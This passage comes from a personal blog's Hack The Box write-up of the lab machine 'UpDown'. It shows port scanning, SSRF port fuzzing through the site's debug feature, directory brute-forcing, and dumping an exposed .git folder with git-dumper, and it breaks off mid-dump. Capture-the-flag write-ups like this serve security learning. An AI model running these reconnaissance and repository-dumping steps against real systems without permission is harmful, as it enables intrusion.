<!DOCTYPE html>









<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en"
  
    data-mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  

  
    
    
    

    
      <!-- it's a local file path -->

    
  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Hack The Box - UpDown" />
<meta property="og:locale" content="en" />
<meta name="description" content="It took me a long time to get a foothold on that machine. But once I was in, getting the user and root was very easy." />
<meta property="og:description" content="It took me a long time to get a foothold on that machine. But once I was in, getting the user and root was very easy." />
<link rel="canonical" href="http://localhost:4000/2023/01/HTB/UpDown" />
<meta property="og:url" content="http://localhost:4000/2023/01/HTB/UpDown" />
<meta property="og:site_name" content="Ankit Kanojiya" />
<meta property="og:image" content="http://localhost:4000/assets/images/UpDown/Up.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-01-21T00:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/images/UpDown/Up.png" />
<meta property="twitter:title" content="Hack The Box - UpDown" />
<meta name="twitter:site" content="@AnkitKanojiya69" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-01-21T00:00:00+08:00","datePublished":"2023-01-21T00:00:00+08:00","description":"It took me a long time to get a foothold on that machine. But once I was in, getting the user and root was very easy.","headline":"Hack The Box - UpDown","image":"http://localhost:4000/assets/images/UpDown/Up.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/01/HTB/UpDown"},"url":"http://localhost:4000/2023/01/HTB/UpDown"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Hack The Box - UpDown | Ankit Kanojiya
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Ankit Kanojiya">
<meta name="application-name" content="Ankit Kanojiya">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/avtar.jpg" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title">
      <a href="/">Ankit Kanojiya</a>
    </div>
    <div class="site-subtitle font-italic">𝐄𝐭𝐡𝐢𝐜𝐚𝐥 𝐇𝐚𝐜𝐤𝐞𝐫 || 𝐒𝐨𝐟𝐭𝐰𝐚𝐫𝐞 𝐄𝐧𝐠𝐢𝐧𝐞𝐞𝐫 || 𝐂𝐲𝐛𝐞𝐫 𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐑𝐞𝐬𝐚𝐫𝐜𝐡𝐞𝐫.!! 𝐎𝐒𝐂𝐏 & 𝐎𝐒𝐄𝐏.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    

    
      

      
      <a href="https://github.com/ankit0183" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/AnkitKanojiya69" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['ankitkanojiya','yandex.ru'].join('@')" aria-label="email"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

      

        

      

        

          
            <span>Hack The Box - UpDown</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">
        





<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->


<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      
        
      
      

      
      

      

      
    
      
      
        
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->

<h1 data-toc-skip>Hack The Box - UpDown</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Posted
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1674230400"
    data-df="ll"
    data-toggle="tooltip" data-placement="bottom">
  Jan 21, 2023
</em>

    </span>

    <!-- lastmod date -->
    

  
    

    <div class="mt-3 mb-3">
      <img data-src="/assets/images/UpDown/Up.png" class="preview-img bg"
        alt="Preview Image"

      

       data-proofer-ignore>

      

    </div>
  

  <div class="d-flex justify-content-between">
    <!-- author(s) -->
    <span>
      

      By

      <em>
      
        <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>
      
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="3975 words">
  <em>22 min</em> read</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>It took me a long time to get a foothold on that machine. But once I was in, getting the user and root was very easy.</p>

<ul>
  <li>Room: UpDown</li>
  <li>Difficulty: Medium</li>
  <li>URL: <a href="https://app.hackthebox.com/machines/UpDown">https://app.hackthebox.com/machines/UpDown</a></li>
  <li>Author: <a href="https://app.hackthebox.com/users/1303">AB2</a></li>
</ul>

<h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>As always, I started by running Rustscan to find open ports.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>rustscan <span class="nt">-a</span> target <span class="nt">--</span> <span class="nt">-v</span> | <span class="nb">tee </span>rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| <span class="o">{}</span>  <span class="o">}</span>| <span class="o">{</span> <span class="o">}</span> |<span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span>|  <span class="sb">`</span>| |
| .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> |.-._<span class="o">}</span> <span class="o">}</span> | |  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> |<span class="se">\ </span> |
<span class="sb">`</span>-<span class="s1">' `-'</span><span class="sb">`</span><span class="nt">-----</span><span class="s1">'`----'</span>  <span class="sb">`</span>-<span class="s1">'  `----'</span>  <span class="sb">`</span><span class="nt">---</span><span class="s1">' `-'</span>  <span class="sb">`</span>-<span class="s1">'`-'</span> <span class="sb">`</span>-<span class="s1">'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan'</span>s speed. Use the Docker image, or up the Ulimit with <span class="s1">'--ulimit 5000'</span><span class="nb">.</span>
Open 10.129.57.44:22
Open 10.129.57.44:80
<span class="o">[</span>~] Starting Script<span class="o">(</span>s<span class="o">)</span>
<span class="o">[&gt;]</span> Script to be run Some<span class="o">(</span><span class="s2">"nmap -vvv -p  "</span><span class="o">)</span>

<span class="o">[</span>~] Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-09-17 07:30 EDT
Initiating Ping Scan at 07:30
Scanning 10.129.57.44 <span class="o">[</span>2 ports]
Completed Ping Scan at 07:30, 0.05s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating Connect Scan at 07:30
Scanning target <span class="o">(</span>10.129.57.44<span class="o">)</span> <span class="o">[</span>2 ports]
Discovered open port 22/tcp on 10.129.57.44
Discovered open port 80/tcp on 10.129.57.44
Completed Connect Scan at 07:30, 0.03s elapsed <span class="o">(</span>2 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>target <span class="o">(</span>10.129.57.44<span class="o">)</span>
Host is up, received conn-refused <span class="o">(</span>0.049s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2022-09-17 07:30:11 EDT <span class="k">for </span>0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>0.13 seconds
</pre></td></tr></tbody></table></code></div></div>

<p>Ports 22 (SSH) and 80 (HTTP) were open.</p>

<h2 id="website"><span class="mr-2">Website</span><a href="#website" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>The website allowed checking if a website was up or not.</p>

<p><img data-src="/assets/images/UpDown/UpDownSite.png" alt="WebSite" title="WebSite" data-proofer-ignore></p>

<p>There was also a debug feature that showed the HTML returned by the site being checked.</p>

<p><img data-src="/assets/images/UpDown/SiteUpWithDebug.png" alt="Debug On" title="Debug On" data-proofer-ignore></p>

<p>When I saw the debug feature, I thought I could use it to do <a href="https://portswigger.net/web-security/ssrf">Server-Side Request Forgery (SSRF)</a>. I tried to use it to check for ports that were only available on the server.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>wfuzz <span class="nt">-z</span> range,1-65535 <span class="nt">-d</span> <span class="s2">"site=http://localhost:FUZZ&amp;debug=1"</span> <span class="nt">--hw</span> 99  http://target.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://target.htb/
Total requests: 65535

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000080:   200        85 L     209 W      2561 Ch     "80"

Total time: 0
Processed Requests: 65535
Filtered Requests: 65534
Requests/sec.: 0
</span></pre></td></tr></tbody></table></code></div></div>

<p>It did not find anything. I launched Feroxbuster to look for hidden pages.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://target.htb <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt <span class="nt">-x</span> php  <span class="nt">-n</span> <span class="nt">-o</span> ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ <span class="o">[</span>200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox.txt
 💲  Extensions            │ <span class="o">[</span>php]
 🏁  HTTP methods          │ <span class="o">[</span>GET]
 🚫  Do Not Recurse        │ <span class="nb">true</span>
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press <span class="o">[</span>ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      275c http://target.htb/.php
403      GET        9l       28w      275c http://target.htb/.html
200      GET       40l       93w     1131c http://target.htb/
403      GET        9l       28w      275c http://target.htb/.html.php
301      GET        9l       28w      306c http://target.htb/dev <span class="o">=&gt;</span> http://target.htb/dev/
200      GET       40l       93w     1131c http://target.htb/index.php
403      GET        9l       28w      275c http://target.htb/.htaccess
403      GET        9l       28w      275c http://target.htb/.htaccess.php
403      GET        9l       28w      275c http://target.htb/.htm
403      GET        9l       28w      275c http://target.htb/.htm.php
403      GET        9l       28w      275c http://target.htb/.phtml
403      GET        9l       28w      275c http://target.htb/.htc
....
</pre></td></tr></tbody></table></code></div></div>

<p>There was a dev folder, I scanned it also.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://target.htb/dev/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt <span class="nt">-x</span> php  <span class="nt">-n</span> <span class="nt">-o</span> feroxDev.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target.htb/dev/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ <span class="o">[</span>200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ feroxDev.txt
 💲  Extensions            │ <span class="o">[</span>php]
 🏁  HTTP methods          │ <span class="o">[</span>GET]
 🚫  Do Not Recurse        │ <span class="nb">true</span>
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press <span class="o">[</span>ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      275c http://target.htb/dev/.php
200      GET        0l        0w        0c http://target.htb/dev/
403      GET        9l       28w      275c http://target.htb/dev/.html
403      GET        9l       28w      275c http://target.htb/dev/.html.php
403      GET        9l       28w      275c http://target.htb/dev/.htaccess
403      GET        9l       28w      275c http://target.htb/dev/.htaccess.php
200      GET        0l        0w        0c http://target.htb/dev/index.php
403      GET        9l       28w      275c http://target.htb/dev/.phtml
403      GET        9l       28w      275c http://target.htb/dev/.htm
403      GET        9l       28w      275c http://target.htb/dev/.htm.php
403      GET        9l       28w      275c http://target.htb/dev/.htc
403      GET        9l       28w      275c http://target.htb/dev/.htc.php
403      GET        9l       28w      275c http://target.htb/dev/.html_var_DE
403      GET        9l       28w      275c http://target.htb/dev/.html_var_DE.php
403      GET        9l       28w      275c http://target.htb/dev/.htpasswd
403      GET        9l       28w      275c http://target.htb/dev/.htpasswd.php
301      GET        9l       28w      311c http://target.htb/dev/.git <span class="o">=&gt;</span> http://target.htb/dev/.git/
403      GET        9l       28w      275c http://target.htb/dev/.html.
403      GET        9l       28w      275c http://target.htb/dev/.html..php
403      GET        9l       28w      275c http://target.htb/dev/.html.html
403      GET        9l       28w      275c http://target.htb/dev/.html.html.php
403      GET        9l       28w      275c http://target.htb/dev/.htpasswds
...
</pre></td></tr></tbody></table></code></div></div>

<p>The dev folder contained a <code class="language-plaintext highlighter-rouge">.git</code> folder. So I used <a href="https://github.com/arthaud/git-dumper">git-dumper</a> to extract it.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>git-dumper http://target.htb/dev/.git/ siteCode/
<span class="o">[</span>-] Testing http://target.htb/dev/.git/HEAD <span class="o">[</span>200]
<span class="o">[</span>-] Testing http://target.htb/dev/.git/ <span class="o">[</span>200]
<span class="o">[</span>-] Fetching .git recursively
<span class="o">[</span>-] Fetching http://target.htb/dev/.gitignore <span class="o">[</span>404]
<span class="o">[</span>-] http://target.htb/dev/.gitignore responded with status code 404
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/ <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/packed-refs <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/description <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/branches/ <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/config <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/HEAD <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/index <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/hooks/ <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/info/ <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/objects/ <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/refs/ <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/info/exclude <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/objects/info/ <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/refs/heads/ <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/objects/pack/ <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/refs/tags/ <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/refs/remotes/ <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/hooks/applypatch-msg.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/hooks/fsmonitor-watchman.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/hooks/commit-msg.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/hooks/post-update.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/hooks/pre-applypatch.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/hooks/pre-commit.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/hooks/pre-merge-commit.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/hooks/pre-push.sample <span class="o">[</span>200]
<span class="o">[</span>-] Fetching http://target.htb/dev/.git/hooks/pre-rebase.sample <span class="o">[</span>200]
